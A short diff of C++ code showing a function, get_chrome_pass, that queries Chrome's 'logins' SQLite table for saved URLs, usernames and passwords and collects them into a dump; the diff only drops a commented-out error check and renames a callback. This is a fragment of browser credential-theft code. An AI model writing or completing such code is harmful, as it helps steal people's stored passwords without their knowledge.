@@ -2,16 +2,6 @@
 
 std::stringstream get_chrome_pass(sqlite3* db)
 {
-    /*
-    int rc;
-
-    if( rc )
-    {
-        std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
-        sqlite3_close(db);
-        return std::stringstream();
-    }
-    */
     std::string sql = "SELECT action_url, username_value, password_value FROM logins";
 
     std::stringstream dump(std::string(""));
@@ -63,7 +53,7 @@ std::stringstream get_chrome_pass(sqlite3* db)
     return dump;
 }
 
-int callback1(void *NotUsed, int argc, char **argv, char **azColName)
+int callback(void *NotUsed, int argc, char **argv, char **azColName)
 {
     for(int i = 0; i < argc; i++) 
     {
